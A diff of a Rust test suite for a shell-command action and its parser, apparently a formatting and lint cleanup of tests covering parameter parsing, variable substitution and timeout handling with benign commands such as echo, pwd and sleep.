@@ -605,7 +605,7 @@ mod enhanced_basic_functionality_tests {
     #[test]
     fn test_shell_action_default_values() {
         let action = ShellAction::new("echo test".to_string());
-        
+
         assert_eq!(action.command, "echo test");
         assert_eq!(action.timeout, None);
         assert_eq!(action.result_variable, None);
@@ -614,71 +614,70 @@ mod enhanced_basic_functionality_tests {
         assert_eq!(action.action_type(), "shell");
     }
 
-    #[test] 
+    #[test]
     fn test_shell_action_comprehensive_builder_pattern() {
         let mut env = HashMap::new();
         env.insert("VAR1".to_string(), "value1".to_string());
         env.insert("VAR2".to_string(), "value2".to_string());
-        
+
         let action = ShellAction::new("echo test".to_string())
             .with_timeout(Duration::from_secs(120))
             .with_result_variable("output".to_string())
             .with_working_dir("/home/user".to_string())
             .with_environment(env.clone());
-            
+
         assert_eq!(action.command, "echo test");
         assert_eq!(action.timeout, Some(Duration::from_secs(120)));
         assert_eq!(action.result_variable, Some("output".to_string()));
         assert_eq!(action.working_dir, Some("/home/user".to_string()));
         assert_eq!(action.environment, env);
     }
-    
+
     #[test]
     fn test_shell_action_builder_pattern_chaining_order() {
         // Test that builder methods can be called in any order
         let action1 = ShellAction::new("cmd".to_string())
             .with_timeout(Duration::from_secs(30))
             .with_result_variable("out".to_string());
-            
+
         let action2 = ShellAction::new("cmd".to_string())
             .with_result_variable("out".to_string())
             .with_timeout(Duration::from_secs(30));
-            
+
         assert_eq!(action1.timeout, action2.timeout);
         assert_eq!(action1.result_variable, action2.result_variable);
     }
-    
+
     #[test]
     fn test_shell_action_description_with_parameters() {
         let action = ShellAction::new("ls -la".to_string())
             .with_timeout(Duration::from_secs(60))
             .with_result_variable("files".to_string());
-            
+
         let description = action.description();
         assert!(description.contains("ls -la"));
         assert!(description.contains("Execute shell command"));
     }
-    
+
     #[test]
     fn test_shell_action_empty_environment_addition() {
-        let action = ShellAction::new("echo test".to_string())
-            .with_environment(HashMap::new());
-            
+        let action = ShellAction::new("echo test".to_string()).with_environment(HashMap::new());
+
         assert!(action.environment.is_empty());
     }
-    
+
     #[test]
     fn test_shell_action_environment_replacement() {
         let mut env1 = HashMap::new();
         env1.insert("VAR1".to_string(), "value1".to_string());
-        
+
         let mut env2 = HashMap::new();
         env2.insert("VAR2".to_string(), "value2".to_string());
-        
+
         let action = ShellAction::new("echo test".to_string())
             .with_environment(env1)
             .with_environment(env2.clone()); // Should replace, not merge
-            
+
         assert_eq!(action.environment, env2);
         assert!(!action.environment.contains_key("VAR1"));
     }
@@ -693,7 +692,7 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_case_variations() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Test different case variations
         let cases = [
             "Shell \"echo hello\"",
@@ -701,7 +700,7 @@ mod comprehensive_parser_tests {
             "SHELL \"echo hello\"",
             "ShElL \"echo hello\"",
         ];
-        
+
         for case in cases {
             let action = parser.parse_shell_action(case).unwrap().unwrap();
             assert_eq!(action.command, "echo hello");
@@ -712,15 +711,24 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_whitespace_handling() {
         let parser = ActionParser::new().unwrap();
-        
-        // Test various whitespace scenarios  
-        let action = parser.parse_shell_action("  Shell   \"echo hello\"  ").unwrap().unwrap();
+
+        // Test various whitespace scenarios
+        let action = parser
+            .parse_shell_action("  Shell   \"echo hello\"  ")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "echo hello");
-        
-        let action = parser.parse_shell_action("Shell\t\"echo hello\"").unwrap().unwrap();
+
+        let action = parser
+            .parse_shell_action("Shell\t\"echo hello\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "echo hello");
-        
-        let action = parser.parse_shell_action("Shell \"echo hello\" with  timeout=30").unwrap().unwrap();
+
+        let action = parser
+            .parse_shell_action("Shell \"echo hello\" with  timeout=30")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "echo hello");
         assert_eq!(action.timeout, Some(Duration::from_secs(30)));
     }
@@ -728,28 +736,40 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_complex_commands() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Test complex command with pipes and arguments
-        let action = parser.parse_shell_action("Shell \"ls -la | grep test\"").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"ls -la | grep test\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "ls -la | grep test");
-        
+
         // Test command with quotes inside
-        let action = parser.parse_shell_action("Shell \"echo 'hello world'\"").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"echo 'hello world'\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "echo 'hello world'");
-        
+
         // Test command with paths
-        let action = parser.parse_shell_action("Shell \"/usr/bin/ls -la\"").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"/usr/bin/ls -la\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.command, "/usr/bin/ls -la");
     }
 
     #[test]
     fn test_parse_shell_action_all_parameters_combined() {
         let parser = ActionParser::new().unwrap();
-        
-        let action = parser.parse_shell_action(
-            "Shell \"echo test\" with timeout=60 result=\"output\" working_dir=\"/tmp\""
-        ).unwrap().unwrap();
-        
+
+        let action = parser
+            .parse_shell_action(
+                "Shell \"echo test\" with timeout=60 result=\"output\" working_dir=\"/tmp\"",
+            )
+            .unwrap()
+            .unwrap();
+
         assert_eq!(action.command, "echo test");
         assert_eq!(action.timeout, Some(Duration::from_secs(60)));
         assert_eq!(action.result_variable, Some("output".to_string()));
@@ -759,25 +779,34 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_parameter_order_independence() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Test different parameter orders
-        let action1 = parser.parse_shell_action(
-            "Shell \"echo test\" with timeout=30 result=\"out\" working_dir=\"/tmp\""
-        ).unwrap().unwrap();
-        
-        let action2 = parser.parse_shell_action(
-            "Shell \"echo test\" with result=\"out\" working_dir=\"/tmp\" timeout=30"
-        ).unwrap().unwrap();
-        
-        let action3 = parser.parse_shell_action(
-            "Shell \"echo test\" with working_dir=\"/tmp\" timeout=30 result=\"out\""
-        ).unwrap().unwrap();
-        
+        let action1 = parser
+            .parse_shell_action(
+                "Shell \"echo test\" with timeout=30 result=\"out\" working_dir=\"/tmp\"",
+            )
+            .unwrap()
+            .unwrap();
+
+        let action2 = parser
+            .parse_shell_action(
+                "Shell \"echo test\" with result=\"out\" working_dir=\"/tmp\" timeout=30",
+            )
+            .unwrap()
+            .unwrap();
+
+        let action3 = parser
+            .parse_shell_action(
+                "Shell \"echo test\" with working_dir=\"/tmp\" timeout=30 result=\"out\"",
+            )
+            .unwrap()
+            .unwrap();
+
         assert_eq!(action1.command, action2.command);
         assert_eq!(action1.timeout, action2.timeout);
         assert_eq!(action1.result_variable, action2.result_variable);
         assert_eq!(action1.working_dir, action2.working_dir);
-        
+
         assert_eq!(action2.command, action3.command);
         assert_eq!(action2.timeout, action3.timeout);
         assert_eq!(action2.result_variable, action3.result_variable);
@@ -787,11 +816,12 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_environment_variables() {
         let parser = ActionParser::new().unwrap();
-        
-        let action = parser.parse_shell_action(
-            r#"Shell "echo $TEST" with env={"TEST": "value", "DEBUG": "1"}"#
-        ).unwrap().unwrap();
-        
+
+        let action = parser
+            .parse_shell_action(r#"Shell "echo $TEST" with env={"TEST": "value", "DEBUG": "1"}"#)
+            .unwrap()
+            .unwrap();
+
         assert_eq!(action.command, "echo $TEST");
         assert_eq!(action.environment.get("TEST"), Some(&"value".to_string()));
         assert_eq!(action.environment.get("DEBUG"), Some(&"1".to_string()));
@@ -800,34 +830,45 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_environment_complex_json() {
         let parser = ActionParser::new().unwrap();
-        
+
         let action = parser.parse_shell_action(
             r#"Shell "echo test" with env={"PATH": "/usr/bin:/bin", "HOME": "/home/user", "DEBUG_LEVEL": "2"}"#
         ).unwrap().unwrap();
-        
+
         assert_eq!(action.command, "echo test");
         assert_eq!(action.environment.len(), 3);
-        assert_eq!(action.environment.get("PATH"), Some(&"/usr/bin:/bin".to_string()));
-        assert_eq!(action.environment.get("HOME"), Some(&"/home/user".to_string()));
-        assert_eq!(action.environment.get("DEBUG_LEVEL"), Some(&"2".to_string()));
+        assert_eq!(
+            action.environment.get("PATH"),
+            Some(&"/usr/bin:/bin".to_string())
+        );
+        assert_eq!(
+            action.environment.get("HOME"),
+            Some(&"/home/user".to_string())
+        );
+        assert_eq!(
+            action.environment.get("DEBUG_LEVEL"),
+            Some(&"2".to_string())
+        );
     }
 
     #[test]
     fn test_parse_shell_action_invalid_syntax_variations() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Missing quotes around command
         let result = parser.parse_shell_action("Shell echo hello").unwrap();
         assert!(result.is_none());
-        
+
         // Invalid parameter name - this should return an error, not None
         let result = parser.parse_shell_action("Shell \"echo\" with invalid_param=value");
         assert!(result.is_err());
-        
+
         // Missing parameter value
-        let result = parser.parse_shell_action("Shell \"echo\" with timeout=").unwrap();
+        let result = parser
+            .parse_shell_action("Shell \"echo\" with timeout=")
+            .unwrap();
         assert!(result.is_none());
-        
+
         // Invalid JSON in environment
         let result = parser.parse_shell_action(r#"Shell "echo" with env={invalid json}"#);
         assert!(result.is_err() || result.unwrap().is_none());
@@ -836,23 +877,29 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_timeout_edge_cases() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Maximum valid timeout
-        let action = parser.parse_shell_action("Shell \"echo\" with timeout=3600").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"echo\" with timeout=3600")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.timeout, Some(Duration::from_secs(3600)));
-        
-        // Minimum valid timeout  
-        let action = parser.parse_shell_action("Shell \"echo\" with timeout=1").unwrap().unwrap();
+
+        // Minimum valid timeout
+        let action = parser
+            .parse_shell_action("Shell \"echo\" with timeout=1")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.timeout, Some(Duration::from_secs(1)));
-        
+
         // Zero timeout should fail
         let result = parser.parse_shell_action("Shell \"echo\" with timeout=0");
         assert!(result.is_err());
-        
+
         // Negative timeout should fail
         let result = parser.parse_shell_action("Shell \"echo\" with timeout=-1");
         assert!(result.is_err());
-        
+
         // Non-numeric timeout should fail
         let result = parser.parse_shell_action("Shell \"echo\" with timeout=abc");
         assert!(result.is_err());
@@ -861,40 +908,67 @@ mod comprehensive_parser_tests {
     #[test]
     fn test_parse_shell_action_result_variable_validation() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Valid variable names
-        let valid_names = ["output", "result_123", "_private", "UPPER_CASE", "mixedCase"];
+        let valid_names = [
+            "output",
+            "result_123",
+            "_private",
+            "UPPER_CASE",
+            "mixedCase",
+        ];
         for name in valid_names {
-            let action = parser.parse_shell_action(&format!("Shell \"echo\" with result=\"{name}\""))
-                .unwrap().unwrap();
+            let action = parser
+                .parse_shell_action(&format!("Shell \"echo\" with result=\"{name}\""))
+                .unwrap()
+                .unwrap();
             assert_eq!(action.result_variable, Some(name.to_string()));
         }
-        
+
         // Invalid variable names
-        let invalid_names = ["123invalid", "invalid-name", "invalid.name", "invalid name", ""];
+        let invalid_names = [
+            "123invalid",
+            "invalid-name",
+            "invalid.name",
+            "invalid name",
+            "",
+        ];
         for name in invalid_names {
-            let result = parser.parse_shell_action(&format!("Shell \"echo\" with result=\"{name}\""));
-            assert!(result.is_err(), "Should reject invalid variable name: {name}");
+            let result =
+                parser.parse_shell_action(&format!("Shell \"echo\" with result=\"{name}\""));
+            assert!(
+                result.is_err(),
+                "Should reject invalid variable name: {name}"
+            );
         }
     }
 
     #[test]
     fn test_parse_shell_action_working_directory_validation() {
         let parser = ActionParser::new().unwrap();
-        
+
         // Valid working directories
-        let action = parser.parse_shell_action("Shell \"pwd\" with working_dir=\"/tmp\"").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"pwd\" with working_dir=\"/tmp\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.working_dir, Some("/tmp".to_string()));
-        
-        let action = parser.parse_shell_action("Shell \"pwd\" with working_dir=\"relative/path\"").unwrap().unwrap();
+
+        let action = parser
+            .parse_shell_action("Shell \"pwd\" with working_dir=\"relative/path\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.working_dir, Some("relative/path".to_string()));
-        
+
         // Empty working directory should fail
         let result = parser.parse_shell_action("Shell \"pwd\" with working_dir=\"\"");
         assert!(result.is_err());
-        
+
         // Working directory with variables should be accepted (validation happens at execution)
-        let action = parser.parse_shell_action("Shell \"pwd\" with working_dir=\"${base_dir}\"").unwrap().unwrap();
+        let action = parser
+            .parse_shell_action("Shell \"pwd\" with working_dir=\"${base_dir}\"")
+            .unwrap()
+            .unwrap();
         assert_eq!(action.working_dir, Some("${base_dir}".to_string()));
     }
 }
@@ -908,8 +982,11 @@ mod comprehensive_variable_substitution_tests {
     async fn test_command_variable_substitution_simple() {
         let action = ShellAction::new("echo ${message}".to_string());
         let mut context = HashMap::new();
-        context.insert("message".to_string(), serde_json::Value::String("hello world".to_string()));
-        
+        context.insert(
+            "message".to_string(),
+            serde_json::Value::String("hello world".to_string()),
+        );
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("hello world"));
@@ -919,9 +996,15 @@ mod comprehensive_variable_substitution_tests {
     async fn test_command_variable_substitution_multiple() {
         let action = ShellAction::new("echo ${greeting} ${name}".to_string());
         let mut context = HashMap::new();
-        context.insert("greeting".to_string(), serde_json::Value::String("Hello".to_string()));
-        context.insert("name".to_string(), serde_json::Value::String("World".to_string()));
-        
+        context.insert(
+            "greeting".to_string(),
+            serde_json::Value::String("Hello".to_string()),
+        );
+        context.insert(
+            "name".to_string(),
+            serde_json::Value::String("World".to_string()),
+        );
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("Hello World"));
@@ -931,9 +1014,15 @@ mod comprehensive_variable_substitution_tests {
     async fn test_command_variable_substitution_nested() {
         let action = ShellAction::new("echo ${prefix}_${suffix}".to_string());
         let mut context = HashMap::new();
-        context.insert("prefix".to_string(), serde_json::Value::String("test".to_string()));
-        context.insert("suffix".to_string(), serde_json::Value::String("file".to_string()));
-        
+        context.insert(
+            "prefix".to_string(),
+            serde_json::Value::String("test".to_string()),
+        );
+        context.insert(
+            "suffix".to_string(),
+            serde_json::Value::String("file".to_string()),
+        );
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("test_file"));
@@ -944,7 +1033,7 @@ mod comprehensive_variable_substitution_tests {
         let action = ShellAction::new("echo count: ${count}".to_string());
         let mut context = HashMap::new();
         context.insert("count".to_string(), serde_json::Value::Number(42.into()));
-        
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("count: 42"));
@@ -955,7 +1044,7 @@ mod comprehensive_variable_substitution_tests {
         let action = ShellAction::new("echo enabled: ${enabled}".to_string());
         let mut context = HashMap::new();
         context.insert("enabled".to_string(), serde_json::Value::Bool(true));
-        
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("enabled: true"));
@@ -963,11 +1052,14 @@ mod comprehensive_variable_substitution_tests {
 
     #[tokio::test]
     async fn test_working_directory_variable_substitution_simple() {
-        let action = ShellAction::new("pwd".to_string())
-            .with_working_dir("${work_dir}".to_string());
+        let action =
+            ShellAction::new("pwd".to_string()).with_working_dir("${work_dir}".to_string());
         let mut context = HashMap::new();
-        context.insert("work_dir".to_string(), serde_json::Value::String("/tmp".to_string()));
-        
+        context.insert(
+            "work_dir".to_string(),
+            serde_json::Value::String("/tmp".to_string()),
+        );
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("/tmp"));
@@ -975,18 +1067,20 @@ mod comprehensive_variable_substitution_tests {
 
     #[tokio::test]
     async fn test_working_directory_variable_substitution_nested() {
-        let action = ShellAction::new("pwd".to_string())
-            .with_working_dir("${base}".to_string());
+        let action = ShellAction::new("pwd".to_string()).with_working_dir("${base}".to_string());
         let mut context = HashMap::new();
-        context.insert("base".to_string(), serde_json::Value::String("/tmp".to_string()));
-        
+        context.insert(
+            "base".to_string(),
+            serde_json::Value::String("/tmp".to_string()),
+        );
+
         let result = action.execute(&mut context).await;
-        
+
         // This might fail if /tmp doesn't exist or isn't accessible, which is ok
         match result {
             Ok(_) => {
                 let stdout = context.get("stdout").unwrap().as_str().unwrap();
-                assert!(stdout.contains("/tmp") || stdout.len() > 0);
+                assert!(stdout.contains("/tmp") || !stdout.is_empty());
             }
             Err(_) => {
                 // Directory might not exist, that's acceptable for this test
@@ -1000,13 +1094,15 @@ mod comprehensive_variable_substitution_tests {
         // Let's test a different scenario that doesn't violate security rules
         let mut env = HashMap::new();
         env.insert("TEST_VAR".to_string(), "${var_value}".to_string());
-        
-        let action = ShellAction::new("echo $TEST_VAR".to_string())
-            .with_environment(env);
+
+        let action = ShellAction::new("echo $TEST_VAR".to_string()).with_environment(env);
         let mut context = HashMap::new();
-        context.insert("var_value".to_string(), serde_json::Value::String("substituted".to_string()));
-        
-        let result = action.execute(&mut context).await.unwrap();
+        context.insert(
+            "var_value".to_string(),
+            serde_json::Value::String("substituted".to_string()),
+        );
+
+        let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         // Should contain either "substituted" or "${var_value}" depending on shell behavior
         assert!(stdout.contains("substituted") || stdout.contains("${var_value}"));
@@ -1018,13 +1114,18 @@ mod comprehensive_variable_substitution_tests {
         env.insert("VAR1".to_string(), "${value1}".to_string());
         env.insert("VAR2".to_string(), "${value2}".to_string());
         env.insert("VAR3".to_string(), "static_value".to_string());
-        
-        let action = ShellAction::new("echo $VAR1 $VAR2 $VAR3".to_string())
-            .with_environment(env);
+
+        let action = ShellAction::new("echo $VAR1 $VAR2 $VAR3".to_string()).with_environment(env);
         let mut context = HashMap::new();
-        context.insert("value1".to_string(), serde_json::Value::String("first".to_string()));
-        context.insert("value2".to_string(), serde_json::Value::String("second".to_string()));
-        
+        context.insert(
+            "value1".to_string(),
+            serde_json::Value::String("first".to_string()),
+        );
+        context.insert(
+            "value2".to_string(),
+            serde_json::Value::String("second".to_string()),
+        );
+
         let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("first"));
@@ -1036,7 +1137,7 @@ mod comprehensive_variable_substitution_tests {
     fn test_variable_substitution_missing_variable() {
         let action = ShellAction::new("echo ${missing_var}".to_string());
         let context = HashMap::new();
-        
+
         let substituted = action.substitute_string(&action.command, &context);
         // Missing variables should remain as-is in the current implementation
         assert_eq!(substituted, "echo ${missing_var}");
@@ -1046,10 +1147,19 @@ mod comprehensive_variable_substitution_tests {
     fn test_variable_substitution_complex_patterns() {
         let action = ShellAction::new("echo ${var1}${var2} ${var3}_suffix".to_string());
         let mut context = HashMap::new();
-        context.insert("var1".to_string(), serde_json::Value::String("prefix".to_string()));
-        context.insert("var2".to_string(), serde_json::Value::String("middle".to_string()));
-        context.insert("var3".to_string(), serde_json::Value::String("value".to_string()));
-        
+        context.insert(
+            "var1".to_string(),
+            serde_json::Value::String("prefix".to_string()),
+        );
+        context.insert(
+            "var2".to_string(),
+            serde_json::Value::String("middle".to_string()),
+        );
+        context.insert(
+            "var3".to_string(),
+            serde_json::Value::String("value".to_string()),
+        );
+
         let substituted = action.substitute_string(&action.command, &context);
         assert_eq!(substituted, "echo prefixmiddle value_suffix");
     }
@@ -1058,8 +1168,11 @@ mod comprehensive_variable_substitution_tests {
     fn test_variable_substitution_special_characters() {
         let action = ShellAction::new("echo '${message}'".to_string());
         let mut context = HashMap::new();
-        context.insert("message".to_string(), serde_json::Value::String("hello & goodbye".to_string()));
-        
+        context.insert(
+            "message".to_string(),
+            serde_json::Value::String("hello & goodbye".to_string()),
+        );
+
         let substituted = action.substitute_string(&action.command, &context);
         assert_eq!(substituted, "echo 'hello & goodbye'");
     }
@@ -1068,8 +1181,11 @@ mod comprehensive_variable_substitution_tests {
     fn test_variable_substitution_empty_value() {
         let action = ShellAction::new("echo start${empty}end".to_string());
         let mut context = HashMap::new();
-        context.insert("empty".to_string(), serde_json::Value::String("".to_string()));
-        
+        context.insert(
+            "empty".to_string(),
+            serde_json::Value::String("".to_string()),
+        );
+
         let substituted = action.substitute_string(&action.command, &context);
         assert_eq!(substituted, "echo startend");
     }
@@ -1079,26 +1195,32 @@ mod comprehensive_variable_substitution_tests {
         let action = ShellAction::new("echo ${input_text}".to_string())
             .with_result_variable("captured_output".to_string());
         let mut context = HashMap::new();
-        context.insert("input_text".to_string(), serde_json::Value::String("test message".to_string()));
-        
+        context.insert(
+            "input_text".to_string(),
+            serde_json::Value::String("test message".to_string()),
+        );
+
         let result = action.execute(&mut context).await.unwrap();
-        
+
         // Check that the result variable contains the substituted output
         let captured = context.get("captured_output").unwrap().as_str().unwrap();
         assert!(captured.contains("test message"));
-        
+
         // Check that the return value also contains the substituted output
         assert!(result.as_str().unwrap().contains("test message"));
     }
 
-    #[tokio::test] 
+    #[tokio::test]
     async fn test_variable_substitution_json_complex_values() {
         let action = ShellAction::new("echo ${json_data}".to_string());
         let mut context = HashMap::new();
         // Test with a JSON string value - but shell might interpret quotes differently
-        context.insert("json_data".to_string(), serde_json::Value::String("test-json-data".to_string()));
-        
-        let result = action.execute(&mut context).await.unwrap();
+        context.insert(
+            "json_data".to_string(),
+            serde_json::Value::String("test-json-data".to_string()),
+        );
+
+        let _result = action.execute(&mut context).await.unwrap();
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("test-json-data"));
     }
@@ -1107,10 +1229,19 @@ mod comprehensive_variable_substitution_tests {
     fn test_variable_substitution_case_sensitive() {
         let action = ShellAction::new("echo ${VAR} ${var} ${Var}".to_string());
         let mut context = HashMap::new();
-        context.insert("VAR".to_string(), serde_json::Value::String("upper".to_string()));
-        context.insert("var".to_string(), serde_json::Value::String("lower".to_string()));
-        context.insert("Var".to_string(), serde_json::Value::String("mixed".to_string()));
-        
+        context.insert(
+            "VAR".to_string(),
+            serde_json::Value::String("upper".to_string()),
+        );
+        context.insert(
+            "var".to_string(),
+            serde_json::Value::String("lower".to_string()),
+        );
+        context.insert(
+            "Var".to_string(),
+            serde_json::Value::String("mixed".to_string()),
+        );
+
         let substituted = action.substitute_string(&action.command, &context);
         assert_eq!(substituted, "echo upper lower mixed");
     }
@@ -1124,40 +1255,54 @@ mod timeout_and_process_management_tests {
 
     #[tokio::test]
     async fn test_successful_command_within_short_timeout() {
-        let action = ShellAction::new("echo hello".to_string())
-            .with_timeout(Duration::from_secs(5));
+        let action =
+            ShellAction::new("echo hello".to_string()).with_timeout(Duration::from_secs(5));
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await.unwrap();
-        
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("failure"),
+            Some(&serde_json::Value::Bool(false))
+        );
         let duration = context.get("duration_ms").unwrap().as_u64().unwrap();
-        assert!(duration < 5000, "Command should complete quickly, took {}ms", duration);
+        assert!(
+            duration < 5000,
+            "Command should complete quickly, took {duration}ms"
+        );
         assert!(result.as_str().unwrap().contains("hello"));
     }
 
-    #[tokio::test] 
+    #[tokio::test]
     async fn test_command_timeout_handling() {
         // Use a command that will definitely timeout on Unix systems
-        let action = ShellAction::new("sleep 3".to_string())
-            .with_timeout(Duration::from_secs(1));
+        let action = ShellAction::new("sleep 3".to_string()).with_timeout(Duration::from_secs(1));
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await.unwrap();
-        
+
         // Should indicate failure due to timeout
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number((-1).into())));
-        
+        assert_eq!(
+            context.get("exit_code"),
+            Some(&serde_json::Value::Number((-1).into()))
+        );
+
         let stderr = context.get("stderr").unwrap().as_str().unwrap();
         assert!(stderr.contains("timed out"));
-        
+
         // Duration should be close to timeout value
         let duration = context.get("duration_ms").unwrap().as_u64().unwrap();
-        assert!(duration >= 1000 && duration < 2000, "Timeout duration was {}ms", duration);
-        
+        assert!(
+            (1000..2000).contains(&duration),
+            "Timeout duration was {duration}ms"
+        );
+
         // Return value should be false for timeout
         assert_eq!(result, serde_json::Value::Bool(false));
     }
@@ -1166,9 +1311,9 @@ mod timeout_and_process_management_tests {
     async fn test_default_timeout_behavior() {
         let action = ShellAction::new("echo hello".to_string()); // No explicit timeout
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await.unwrap();
-        
+
         // Should succeed with default timeout (no timeout in this case)
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         assert!(result.as_str().unwrap().contains("hello"));
@@ -1177,10 +1322,10 @@ mod timeout_and_process_management_tests {
     #[tokio::test]
     async fn test_timeout_validation_at_execution() {
         // Test that timeout validation occurs during execution
-        let action = ShellAction::new("echo test".to_string())
-            .with_timeout(Duration::from_secs(4000)); // Exceeds maximum
+        let action =
+            ShellAction::new("echo test".to_string()).with_timeout(Duration::from_secs(4000)); // Exceeds maximum
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
         assert!(result.is_err());
         let error_msg = result.unwrap_err().to_string();
@@ -1190,38 +1335,49 @@ mod timeout_and_process_management_tests {
     #[tokio::test]
     async fn test_timeout_precision() {
         // Test timeout precision with a shorter timeout
-        let action = ShellAction::new("sleep 2".to_string())
-            .with_timeout(Duration::from_millis(500));
+        let action =
+            ShellAction::new("sleep 2".to_string()).with_timeout(Duration::from_millis(500));
         let mut context = HashMap::new();
-        
+
         let start = std::time::Instant::now();
         let result = action.execute(&mut context).await.unwrap();
         let elapsed = start.elapsed();
-        
+
         // Should timeout after approximately 500ms
         assert!(elapsed >= Duration::from_millis(450) && elapsed < Duration::from_millis(1000));
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(result, serde_json::Value::Bool(false));
     }
 
     #[tokio::test]
     async fn test_timeout_with_fast_failing_command() {
         // Test timeout with a command that fails quickly
-        let action = ShellAction::new("exit 1".to_string())
-            .with_timeout(Duration::from_secs(10));
+        let action = ShellAction::new("exit 1".to_string()).with_timeout(Duration::from_secs(10));
         let mut context = HashMap::new();
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
+
         // Should fail due to exit code, not timeout
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number(1.into())));
-        
+        assert_eq!(
+            context.get("exit_code"),
+            Some(&serde_json::Value::Number(1.into()))
+        );
+
         // Duration should be much less than timeout
         let duration = context.get("duration_ms").unwrap().as_u64().unwrap();
-        assert!(duration < 1000, "Command should fail quickly, took {}ms", duration);
-        
+        assert!(
+            duration < 1000,
+            "Command should fail quickly, took {duration}ms"
+        );
+
         // stderr should not contain timeout message
         let stderr = context.get("stderr").unwrap().as_str().unwrap();
         assert!(!stderr.contains("timed out"));
@@ -1229,24 +1385,33 @@ mod timeout_and_process_management_tests {
 
     #[tokio::test]
     async fn test_timeout_context_variables() {
-        let action = ShellAction::new("sleep 2".to_string())
-            .with_timeout(Duration::from_millis(100));
+        let action =
+            ShellAction::new("sleep 2".to_string()).with_timeout(Duration::from_millis(100));
         let mut context = HashMap::new();
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
+
         // Verify all timeout-specific context variables are set correctly
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number((-1).into())));
-        assert_eq!(context.get("stdout"), Some(&serde_json::Value::String("".to_string())));
-        
+        assert_eq!(
+            context.get("exit_code"),
+            Some(&serde_json::Value::Number((-1).into()))
+        );
+        assert_eq!(
+            context.get("stdout"),
+            Some(&serde_json::Value::String("".to_string()))
+        );
+
         let stderr = context.get("stderr").unwrap().as_str().unwrap();
         assert_eq!(stderr, "Command timed out");
-        
+
         assert!(context.contains_key("duration_ms"));
         let duration = context.get("duration_ms").unwrap().as_u64().unwrap();
-        assert!(duration >= 100 && duration < 500);
+        assert!((100..500).contains(&duration));
     }
 
     #[tokio::test]
@@ -1255,9 +1420,9 @@ mod timeout_and_process_management_tests {
             .with_timeout(Duration::from_millis(100))
             .with_result_variable("output".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await.unwrap();
-        
+
         // Result variable should NOT be set on timeout
         assert!(!context.contains_key("output"));
         assert_eq!(result, serde_json::Value::Bool(false));
